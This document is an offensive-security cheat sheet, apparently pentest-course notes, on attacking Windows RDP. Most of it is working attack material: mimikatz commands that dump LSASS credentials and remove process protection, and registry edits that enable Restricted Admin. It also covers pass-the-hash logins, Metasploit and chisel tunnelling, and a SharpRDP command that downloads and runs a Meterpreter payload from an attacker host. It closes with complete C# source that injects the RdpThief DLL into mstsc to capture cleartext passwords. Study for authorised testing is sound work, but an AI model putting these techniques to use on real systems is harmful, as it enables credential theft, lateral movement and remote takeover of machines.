# RDP

## General

If you can RDP to a remote host use mimikatz to dump passwords

```bash
privilege::debug
!+
!processprotect /process:lsass.exe /remove
sekurlsa::logonpasswords
```

Restricted admin mode can be used to RDP without credentials

{% code overflow="wrap" %}
```powershell
mstsc.exe /restrictedadmin
# Registry path for DisableRestrictedAdmin
HKLM:\System\CurrentControlSet\Control\Lsa
# Deleting registry key required to use restricted admin mode
Remove-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin
# Enabling restricted admin mode
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0
```
{% endcode %}

PassTheHash RDP with Mimikatz & Restricted Admin

{% code overflow="wrap" %}
```powershell
privilege::debug
sekurlsa::pth /user:admin /domain:corp1 /ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:"mstsc.exe /restrictedadmin"
```
{% endcode %}

PassTheHash RDP with xfreerdp

{% code overflow="wrap" %}
```bash
xfreerdp /u:admin /pth:2892D26CDF84D7A70E2EB3B9F05C425E /v:192.168.120.6 /cert-ignore
```
{% endcode %}

## Reverse RDP Proxying with Metasploit

<pre class="language-bash"><code class="lang-bash"><strong># Once you have a shell with Metasploit start autoroute
</strong><strong>use multi/manage/autoroute
</strong>set session 1
exploit
# Setup socks proxy
use auxiliary/server/socks4a
set srvhost 127.0.0.1
exploit -j
# Configure Proxychains for reverse tunnel
sudo bash -c 'echo "socks4 127.0.0.1 1080" >> /etc/proxychains.conf'
# Remote Desktop is proxied through the tunnel
proxychains rdesktop 192.168.120.10</code></pre>

## Reverse RDP Proxying with Chisel

<pre class="language-bash" data-overflow="wrap"><code class="lang-bash"># Install Golang on Kali Linux
sudo apt install golang
# ClonE chisel from GitHub
git clone https://github.com/jpillora/chisel.git
# Compile chisel for Linux
cd chisel/
go build
# Compile chisel for Windows
env GOOS=windows GOARCH=amd64 go build -o chisel.exe -ldflags "-s -w"
# Starting chisel in server mode
./chisel server -p 8080 --socks5
<strong># Configure SSH as a SOCKS proxy on Kali
</strong>## Enable password authentication
sudo sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/g' /etc/ssh/sshd_config
## Start the service
sudo systemctl start ssh.service
## Connect with SSH
ssh -N -D 0.0.0.0:1080 localhost
## Starting chisel as client
chisel.exe client 192.168.119.120:8080 socks
# RDP session is tunneled with chisel
sudo proxychains rdesktop 192.168.120.10</code></pre>

## RDP as a Console

{% code overflow="wrap" %}
```bash
# Spawning Notepad with SharpRDP
SharpRDP.exe computername=appsrv01 command=notepad username=corp1\dave password=lab
# Spawning a reverse Meterpreter shell through SharpRDP
sharprdp.exe computername=appsrv01 command="powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/met.exe', 'C:\Windows\Tasks\met.exe'); C:\Windows\Tasks\met.exe" username=corp1\dave password=lab
```
{% endcode %}

## Stealing Clear Text Credentials from RDP

```bash
# Copy RdpThief.exe & RdpThief.dll to target and run
/home/kali/data/OSEP/RdpThief.exe
/home/kali/data/OSEP/RdpThief.dll 
# Dump credentials
type C:\Users\data\AppData\Local\Temp\3\data.bin
```

```csharp
using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace Inject
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        static void Main(string[] args)
        {
          String dllName = "C:\\Tools\\RdpThief.dll";
          while(true)
          {
            Process[] mstscProc = Process.GetProcessesByName("mstsc");
            if(mstscProc.Length > 0)
            {
              for(int i = 0; i < mstscProc.Length; i++)
              {
                int pid = mstscProc[i].Id;

                IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
                IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
                IntPtr outSize;
                Boolean res = WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);
                IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
                IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
              }
            }

            Thread.Sleep(1000);
          }
        }
    }
}
```
